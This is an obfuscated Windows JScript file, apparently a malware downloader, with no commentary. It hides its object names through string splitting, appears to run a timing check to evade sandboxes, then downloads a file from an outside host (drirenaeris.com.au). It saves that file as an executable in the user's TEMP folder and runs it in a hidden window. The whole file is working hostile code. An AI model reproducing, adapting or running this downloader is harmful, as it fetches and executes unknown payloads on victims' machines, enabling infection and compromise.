var F = false;
var L0 = "Create"+"Object";
var QO = function KW() {return WScript[L0]("WScript"+".Shell");}(), QG = 11;
var J = "MSXML2"+".XMLHTTP";
var MS = 2;
var FV = MS - 2;
function Y(SN){QO["Run"](SN, FV, FV);};
function JI(){return J + "";};
function Z(XR, QG0){FV = FV * 1; return XR - QG0;};
function L(){return L0;};
/*@cc_on
  @if (@_win32 || @_win64)
    F = true;
  @end
@*/
if (F)
{
var SS = "";
function KY(){return 22;};
var DT = 0; var EA = 0;
function FM()
{
var KD = new this["Date"]();
var V = KD["getUTCMilliseconds"]();
WScript["Sleep"](KY());
var KD = new this["Date"]();
var XW = KD["getUTCMilliseconds"]();
WScript["Sleep"](KY());
var KD = new this["Date"]();
var KR = KD["getUTCMilliseconds"]();
var DT = "C0";
DT = Z(XW, V);
var EA = "Z0";
EA = Z(KR, XW);
SS = "open";
return Z(DT, EA);
}
var J0 = false;
var D = false;
for (var B = FV; B < KY() * 1; B++){if (FM() != FV){
J0 = true; 
EA = "31" + 11 * DT + EA; 
D = true; 
break;
}}
function C() {return ((J0 == true) && (J0 == D)) ? 1 : FV;};
if (J0 && C() && D){
function PM() {return QO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0J0kiLIBtuDi4vk.ex" + "e";};
 YR = JI();
 YE = WScript[L0](YR);
 var BJ = 1;
do { 
	for (;BJ;){
	try {
		if (BJ == 1)
		{
			YE[SS]("GET", "http://drirenaeris.com.au/b7eir", false);
			YE["send"]();
			K = "Sleep";
			BJ = 2;
		}
		WScript[K](KY() + 120); 
		if (YE["readystate"] < 2 * 2) continue;
		BJ = FV;
		function FF(UD) {var PH = (1, 2, 3, 4, 5, UD); return PH;};
		I = WScript[L()]("ADODB.Stream");
		YR = I;
		YR[SS]();
		YR["type"] = FF(1);
		YR["write"](YE["ResponseBody"]);
		I["position"] = FF(FV);
		YR["Save" + "ToFile"](PM(), 2);
		I["cl"+"ose"]();
		Y0 = PM();
		Y(Y0);
	} catch(XV){};};
}while (BJ);
}
}

